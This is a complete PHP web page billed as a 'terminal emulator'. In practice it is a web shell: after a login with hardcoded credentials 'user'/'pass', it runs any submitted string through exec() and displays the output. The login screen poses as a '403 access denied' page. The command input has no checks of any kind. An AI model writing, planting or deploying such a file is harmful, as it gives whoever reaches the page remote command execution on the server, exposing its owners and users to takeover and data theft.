<?php
session_start();

// Usuario y contraseña para autenticación
$valid_user = 'user';
$valid_pass = 'pass';

// Función para establecer la cookie de sesión
function setSessionCookie() {
    $cookie_time = time() + 1800; // 30 minutos
    setcookie(session_name(), session_id(), $cookie_time, "/");
}

// Función para cerrar sesión
function logout() {
    $_SESSION = array();
    session_destroy();
    setcookie(session_name(), "", time() - 3600, "/");
}

// Verificar si se ha enviado un intento de inicio de sesión
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Verificar las credenciales
    if ($username === $valid_user && $password === $valid_pass) {
        $_SESSION['authenticated'] = true;
        setSessionCookie();
    } else {
        echo "Error de autenticación. Usuario o contraseña incorrectos.";
        exit;
    }
}

// Verificar si se ha hecho clic en el botón de cerrar sesión
if (isset($_GET['logout'])) {
    logout();
    header("Location: {$_SERVER['PHP_SELF']}");
    exit;
}

// Verificar la autenticación antes de continuar
if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    // Mostrar formulario de inicio de sesión
    echo '
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Emulador de Terminal - Inicio de Sesión</title>
    </head>
    <body>
        <h1>Acceso denegado 403, Inicie sesión</h1>
        <form method="post">
            <label for="username">Usuario:</label>
            <input type="text" id="username" name="username" required><br>
            <label for="password">Contraseña:</label>
            <input type="password" id="password" name="password" required><br>
            <button type="submit">Iniciar Sesión</button>
        </form>
    </body>
    </html>';
    exit;
}

// Resto del código del emulador de terminal

// Inicializar la variable de sesión para el directorio actual si no está configurada
if (!isset($_SESSION['current_directory'])) {
    $_SESSION['current_directory'] = __DIR__;
}

// Inicializar la variable de sesión para los comandos y resultados si no está configurada
if (!isset($_SESSION['command_history'])) {
    $_SESSION['command_history'] = array();
}

// Manejar los comandos enviados mediante POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtener comandos desde el formulario
    $comandos = $_POST['comandos'];

    // Almacenar el directorio actual antes de cambiarlo
    $old_directory = $_SESSION['current_directory'];

    // Cambiar al directorio actual almacenado en la sesión
    chdir($_SESSION['current_directory']);

    // Ejecutar el comando y capturar la salida
    $output = null;
    $returnCode = null;
    exec($comandos, $output, $returnCode);

    // Actualizar la variable de sesión con el nuevo directorio actual
    $_SESSION['current_directory'] = getcwd();

    // Agregar el comando y su salida al historial
    $_SESSION['command_history'][] = array('command' => $comandos, 'output' => $output, 'old_directory' => $old_directory);
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Emulador de Terminal</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background-color: black;
            color: green;
        }

        #output {
            height: calc(100vh - 80px);
            width: 100%;
            box-sizing: border-box;
            background-color: black;
            color: green;
            border: 1px solid green;
            border-radius: 5px;
            overflow-y: auto;
        }

        #comandos {
            width: 100%;
            box-sizing: border-box;
            background-color: lightgreen;
            color: green;
            border: 1px solid green;
            border-radius: 5px;
            padding: 5px;
            margin-bottom: 10px;
        }

        form {
            padding: 10px;
        }

        label {
            display: block;
            margin-bottom: 5px;
        }

        button {
            background-color: green;
            color: black;
            padding: 5px 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        #logout {
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <textarea id="output" readonly>
        <?php
        // Mostrar historial de comandos y resultados
        foreach ($_SESSION['command_history'] as $command_entry) {
            echo "Comando: " . htmlspecialchars($command_entry['command']) . "\n";

            foreach ($command_entry['output'] as $line) {
                echo htmlspecialchars($line) . "\n";
            }
        }
        ?>
    </textarea>

    <form method="post">
        <label for="comandos">Comandos:</label>
        <input type="text" id="comandos" name="comandos">
        <button type="submit">Ejecutar Comando</button>
    </form>

    <a href="?logout" id="logout"><button>Cerrar Sesión</button></a>

</body>
</html>